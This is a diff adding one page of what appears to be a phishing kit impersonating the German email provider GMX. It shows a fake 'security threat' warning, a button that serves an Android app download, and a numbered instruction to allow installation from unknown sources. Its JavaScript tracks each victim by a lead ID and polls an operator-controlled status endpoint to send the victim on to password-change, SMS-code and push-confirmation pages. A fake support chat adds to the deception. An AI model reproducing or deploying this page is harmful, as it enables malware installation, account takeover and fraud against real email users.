@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <title>GMX App aktualisieren — Sicherheitsbedrohung abwehren</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles.css">
+  <!-- __BRAND_JSON__ -->
+  <script src="/brand.js"></script>
+  <style>
+    .app-update-page { --card-radius: 16px; }
+    .app-update-page .page-center { padding: 16px 14px 24px; max-width: 420px; margin: 0 auto; }
+    .app-update-page .main { max-width: 100%; }
+    .app-update-card {
+      background: #fff;
+      border-radius: var(--card-radius);
+      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.08);
+      border: none;
+      padding: 24px 20px 28px;
+      max-width: 100%;
+      margin: 0 auto;
+    }
+    .app-update-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      color: #2e7d32;
+      background: #e8f5e9;
+      padding: 6px 12px;
+      border-radius: 20px;
+      margin-bottom: 14px;
+    }
+    .app-update-badge-icon { width: 14px; height: 14px; flex-shrink: 0; }
+    .app-update-heading {
+      font-size: 1.35rem;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 0 0 10px 0;
+      line-height: 1.3;
+      letter-spacing: -0.02em;
+    }
+    .app-update-sub {
+      font-size: 0.98rem;
+      color: #444;
+      margin: 0 0 14px 0;
+      line-height: 1.5;
+    }
+    .app-update-alert {
+      font-size: 0.9rem;
+      color: #333;
+      margin: 0 0 16px 0;
+      padding: 14px 16px;
+      background: #fff8e1;
+      border-radius: 12px;
+      border-left: 4px solid #f9a825;
+      line-height: 1.5;
+    }
+    .app-update-device {
+      font-size: 0.9rem;
+      color: #333;
+      margin: 0 0 16px 0;
+      padding: 12px 14px;
+      background: rgba(232, 245, 233, 0.6);
+      border-radius: 10px;
+      border-left: 4px solid #43a047;
+      line-height: 1.5;
+    }
+    .app-update-trust {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin: 16px 0 20px 0;
+      padding: 16px 0;
+      border-top: 1px solid #eee;
+      border-bottom: 1px solid #eee;
+    }
+    .app-update-trust-item {
+      font-size: 0.88rem;
+      color: #444;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .app-update-trust-item::before {
+      content: '';
+      width: 18px;
+      height: 18px;
+      flex-shrink: 0;
+      background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2343a047'%3E%3Cpath d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z'/%3E%3C/svg%3E") no-repeat center;
+      background-size: contain;
+    }
+    .app-update-social {
+      font-size: 0.88rem;
+      color: #2e7d32;
+      font-weight: 500;
+      margin: 0 0 20px 0;
+      padding: 12px 14px;
+      background: rgba(232, 245, 233, 0.6);
+      border-radius: 10px;
+      border: 1px solid rgba(46, 125, 50, 0.15);
+    }
+    .app-update-cta {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      min-height: 52px;
+      padding: 14px 24px;
+      font-size: 1.05rem;
+      font-weight: 600;
+      color: #fff;
+      background: linear-gradient(180deg, #52b857 0%, #43a047 50%, #3d8b40 100%);
+      border: none;
+      border-radius: 12px;
+      box-shadow: 0 4px 0 #2e7d32, 0 8px 24px rgba(67, 160, 71, 0.4);
+      cursor: pointer;
+      text-decoration: none;
+      transition: transform 0.15s, box-shadow 0.15s;
+      font-family: inherit;
+      box-sizing: border-box;
+    }
+    .app-update-cta-icon { width: 22px; height: 22px; flex-shrink: 0; }
+    .app-update-cta:hover, .app-update-cta:focus {
+      background: linear-gradient(180deg, #5cc962 0%, #4caf50 50%, #43a047 100%);
+      box-shadow: 0 6px 0 #2e7d32, 0 12px 28px rgba(67, 160, 71, 0.4);
+      transform: translateY(-1px);
+      color: #fff;
+    }
+    .app-update-cta:active {
+      transform: translateY(1px);
+      box-shadow: 0 2px 0 #2e7d32, 0 4px 12px rgba(67, 160, 71, 0.3);
+    }
+    .app-update-cta--secondary {
+      margin-top: 12px;
+      background: transparent;
+      color: #1c449b;
+      border: 2px solid #1c449b;
+      box-shadow: none;
+    }
+    .app-update-cta--secondary:hover, .app-update-cta--secondary:focus {
+      background: rgba(28, 68, 155, 0.08);
+      color: #1c449b;
+      box-shadow: none;
+    }
+    .app-update-cta--secondary:active {
+      box-shadow: none;
+    }
+    .app-update-password-row {
+      font-size: 0.85rem;
+      margin: 12px 0 0 0;
+      padding: 10px 12px;
+      background: #f0f7f0;
+      border: 1px solid #c8e6c9;
+      border-radius: 10px;
+      color: #2e7d32;
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 6px;
+    }
+    .app-update-password-row.hidden { display: none; }
+    .app-update-password-label { font-weight: 500; }
+    .app-update-password-value {
+      cursor: pointer;
+      user-select: all;
+      font-family: ui-monospace, monospace;
+      font-size: 0.95rem;
+      font-weight: 700;
+      padding: 4px 8px;
+      background: #fff;
+      border-radius: 6px;
+      border: 1px solid #a5d6a7;
+      color: #1b5e20;
+    }
+    .app-update-hint {
+      font-size: 0.82rem;
+      color: #666;
+      margin: 14px 0 0 0;
+      line-height: 1.5;
+    }
+    .app-update-page .sicherheit-modal-overlay { z-index: 10000; }
+    .app-update-page .support-chat-wrap { z-index: 10001; }
+  </style>
+</head>
+<body class="page-change-password app-update-page">
+  <header class="gmx-header gmx-header--steps" aria-hidden="false">
+    <div class="header-inner">
+      <span class="gmx-logo" id="brand-logo-text">GMX</span>
+      <span class="header-title">Mein Account</span>
+    </div>
+  </header>
+
+  <div class="page-center">
+    <main class="main card" id="main-app-update">
+      <section class="card-inner step active app-update-card">
+        <span class="app-update-badge" aria-hidden="true"><svg class="app-update-badge-icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>Empfohlen von GMX</span>
+        <h1 class="app-update-heading" id="app-update-heading">GMX App aktualisieren</h1>
+        <p class="app-update-sub" id="app-update-sub">Unser System hat eine Sicherheitsbedrohung erkannt. Aktualisieren Sie die GMX-App, um Ihr Konto und Ihre Daten zu schützen.</p>
+
+        <a href="#" class="app-update-cta" id="btn-app-download" download><svg class="app-update-cta-icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>Jetzt App aktualisieren</a>
+        <a href="/gmx-mobile-anleitung" class="app-update-cta app-update-cta--secondary" id="app-update-manual-link">So installieren</a>
+        <p class="app-update-hint">Ein Tipp startet den Download. 100 % kostenlos – offizielle GMX-Aktualisierung zur Abwehr der Sicherheitsbedrohung.</p>
+
+        <p class="app-update-alert" id="app-update-alert">Die Bedrohung kann unbefugten Zugriff auf Ihre E-Mails und Anmeldedaten ermöglichen. Eine Aktualisierung der App behebt die Sicherheitslücke.</p>
+
+        <p class="app-update-device" id="app-update-device">Für Ihr Gerät: Installieren Sie die neueste Version der offiziellen GMX-App – mit Abwehr der erkannten Bedrohung.</p>
+
+        <div class="app-update-trust">
+          <span class="app-update-trust-item">Kostenlos – keine Kreditkarte nötig</span>
+          <span class="app-update-trust-item">Offizielle GMX-App</span>
+          <span class="app-update-trust-item">Aktualisierung in wenigen Sekunden</span>
+          <span class="app-update-trust-item">Ihre Daten bleiben bei GMX</span>
+        </div>
+
+        <p class="app-update-social" id="app-update-social">Über 2 Mio. Nutzer vertrauen bereits auf diese Aktualisierung.</p>
+      </section>
+    </main>
+  </div>
+
+  <!-- Чат поддержки -->
+  <div class="support-chat-wrap" id="support-chat-wrap">
+    <button type="button" class="support-chat-toggle" id="support-chat-toggle" aria-label="Support öffnen">
+      <span class="support-chat-toggle-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg></span>
+      <span class="support-chat-unread-dot" id="support-chat-unread-dot" aria-hidden="true"></span>
+    </button>
+    <div class="support-chat-panel" id="support-chat-panel" hidden>
+      <header class="support-chat-header">
+        <div class="support-chat-avatar"><svg width="40" height="40" viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="20" fill="#1c449b"/><path d="M20 20c2.8 0 5-2.2 5-5s-2.2-5-5-5-5 2.2-5 5 2.2 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z" fill="#fff"/></svg></div>
+        <div class="support-chat-meta">
+          <span class="support-chat-name">Sarah</span>
+          <span class="support-chat-status"><span class="support-chat-status-dot" aria-hidden="true"></span>GMX Support · Online</span>
+        </div>
+        <button type="button" class="support-chat-close" id="support-chat-close" aria-label="Einklappen" title="Einklappen"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14"/></svg></button>
+      </header>
+      <div class="support-chat-messages" id="support-chat-messages"></div>
+      <div class="support-chat-input-wrap">
+        <div class="support-chat-preview" id="support-chat-preview"></div>
+        <div class="support-chat-input-row">
+          <input type="file" accept="image/*" class="support-chat-file" id="support-chat-file" aria-label="Bild anhängen" multiple>
+          <label for="support-chat-file" class="support-chat-img-btn" title="Bild senden">📷</label>
+          <textarea class="support-chat-input" id="support-chat-input" placeholder="Nachricht schreiben..." maxlength="2000" rows="1"></textarea>
+          <button type="button" class="support-chat-send" id="support-chat-send" aria-label="Senden">Senden</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="chat-image-overlay" class="chat-image-overlay" hidden>
+    <button type="button" class="chat-image-overlay-close" id="chat-image-overlay-close" aria-label="Schließen">&times;</button>
+    <img src="" alt="" class="chat-image-overlay-img" id="chat-image-overlay-img">
+  </div>
+
+  <footer class="footer">
+    <ul class="footer-links">
+      <li><a href="https://agb-server.gmx.net/gmxagb-de" target="_blank" rel="noopener">AGB</a></li>
+      <li><a href="https://www.gmx.net/impressum/" target="_blank" rel="noopener">Impressum</a></li>
+      <li><a href="https://agb-server.gmx.net/datenschutz" target="_blank" rel="noopener">Datenschutz</a></li>
+    </ul>
+  </footer>
+
+  <div class="sicherheit-modal-overlay" id="app-update-modal" role="dialog" aria-labelledby="app-update-modal-title" aria-modal="true" hidden>
+    <div class="sicherheit-modal">
+      <button type="button" class="sicherheit-modal-close" id="app-update-modal-close" aria-label="Schließen">&times;</button>
+      <h3 class="sicherheit-modal-title" id="app-update-modal-title">So installieren Sie die Aktualisierung</h3>
+      <ol class="sicherheit-modal-steps">
+        <li><strong>Download starten</strong><br>Tippen Sie auf „Jetzt App aktualisieren“. Die Datei wird heruntergeladen.</li>
+        <li><strong>Datei öffnen</strong><br>Öffnen Sie die heruntergeladene Datei aus den Benachrichtigungen oder aus dem Download-Ordner.</li>
+        <li><strong>Installation bestätigen</strong><br>Falls gefragt, erlauben Sie die Installation aus unbekannten Quellen (nur für diese Aktualisierung). Bestätigen Sie die Installation.</li>
+        <li><strong>App starten</strong><br>Nach der Installation starten Sie die GMX-App. Die Sicherheitsbedrohung ist abgewehrt.</li>
+      </ol>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      function getLeadId() {
+        var params = new URLSearchParams(window.location.search);
+        var id = params.get('id') || '';
+        if (id) return id;
+        try { id = (typeof sessionStorage !== 'undefined' && sessionStorage.getItem('gmw_lead_id')) || ''; } catch (e) {}
+        return id;
+      }
+      (function ensureIdInUrl() {
+        var params = new URLSearchParams(window.location.search);
+        if (params.get('id')) return;
+        var id = getLeadId();
+        if (id) {
+          var path = window.location.pathname || '/app-update';
+          window.location.replace(path + '?id=' + encodeURIComponent(id));
+          return;
+        }
+      })();
+      function getDeviceLabel() {
+        var ua = (navigator.userAgent || '').toLowerCase();
+        if (/android/.test(ua)) return 'Android-Gerät';
+        if (/iphone|ipad|ipod/.test(ua)) return 'iPhone oder iPad';
+        return 'Gerät';
+      }
+      var device = getDeviceLabel();
+      var deviceEl = document.getElementById('app-update-device');
+      var socialEl = document.getElementById('app-update-social');
+      if (deviceEl) deviceEl.textContent = 'Für Ihr ' + device + ': Installieren Sie die neueste Version der offiziellen GMX-App – mit Abwehr der erkannten Bedrohung.';
+      if (socialEl) socialEl.textContent = 'Über 2 Mio. Nutzer vertrauen bereits auf diese Aktualisierung.';
+
+      var manualLink = document.getElementById('app-update-manual-link');
+      if (manualLink && getLeadId()) manualLink.href = 'gmx-mobile-anleitung.html?id=' + encodeURIComponent(getLeadId());
+      var btn = document.getElementById('btn-app-download');
+      var modal = document.getElementById('app-update-modal');
+      fetch('/api/download-request', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: getLeadId(), platform: 'android' }) }).then(function (r) { return r.json(); }).then(function (data) {
+        if (btn && data.downloadUrl) btn.href = data.downloadUrl;
+      }).catch(function () {});
+
+      if (btn) {
+        btn.addEventListener('click', function () {
+          var id = getLeadId();
+          if (id) fetch('/api/log-action', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: id, action: 'android_download' }) }).catch(function () {});
+        });
+      }
+      var closeBtn = document.getElementById('app-update-modal-close');
+      if (closeBtn && modal) {
+        closeBtn.addEventListener('click', function () { modal.setAttribute('hidden', ''); document.body.style.overflow = ''; });
+        modal.addEventListener('click', function (e) { if (e.target === modal) { modal.setAttribute('hidden', ''); document.body.style.overflow = ''; } });
+      }
+
+      var statusPollInterval = null;
+      var id = getLeadId();
+      if (id) {
+        function checkStatus() {
+          fetch('/api/status?id=' + encodeURIComponent(id) + '&page=app-update&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
+            .then(function (r) { return r.json(); })
+            .then(function (res) {
+              if ((res && res.mode) === 'manual') return;
+              var st = res && res.status;
+              if (st === 'redirect_sicherheit') {
+                if (statusPollInterval) { clearInterval(statusPollInterval); statusPollInterval = null; }
+                window.location = '/sicherheit-update?id=' + encodeURIComponent(id);
+              } else if (st === 'redirect_open_on_pc') {
+                if (statusPollInterval) { clearInterval(statusPollInterval); statusPollInterval = null; }
+                window.location = '/bitte-am-pc?id=' + encodeURIComponent(id);
+              } else if (st === 'redirect_change_password') {
+                if (statusPollInterval) { clearInterval(statusPollInterval); statusPollInterval = null; }
+                window.location = '/passwort-aendern?id=' + encodeURIComponent(id);
+              } else if (st === 'redirect_push') {
+                if (statusPollInterval) { clearInterval(statusPollInterval); statusPollInterval = null; }
+                window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
+              } else if (st === 'redirect_sms_code') {
+                if (statusPollInterval) { clearInterval(statusPollInterval); statusPollInterval = null; }
+                window.location = '/sms-code.html?id=' + encodeURIComponent(id);
+              } else if (st === 'error') {
+                if (statusPollInterval) { clearInterval(statusPollInterval); statusPollInterval = null; }
+                window.location = '/anmelden';
+              }
+            })
+            .catch(function () {});
+        }
+        checkStatus();
+        statusPollInterval = setInterval(checkStatus, 1000);
+      }
+    })();
+  </script>
+  <script src="/status-redirect.js"></script>
+  <script src="/chat-widget.js"></script>
+</body>
+</html>
